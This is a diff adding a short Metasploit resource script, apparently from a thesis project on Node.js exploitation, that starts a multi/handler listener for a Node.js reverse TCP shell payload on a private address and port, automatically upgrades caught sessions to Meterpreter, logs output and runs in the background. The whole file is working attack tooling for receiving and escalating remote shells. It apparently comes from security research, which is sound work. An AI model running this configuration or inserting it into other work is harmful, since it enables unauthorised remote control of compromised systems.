@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set payload nodejs/shell_reverse_tcp
+set lhost 192.168.64.128
+set lport 1234
+set ExitOnSession true 
+set InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter' 
+spool /root/Desktop/thesis_final/nodexp_20180816/nodexp/scripts/nodejs_shell.rc.output.txt
+exploit -j -z
+
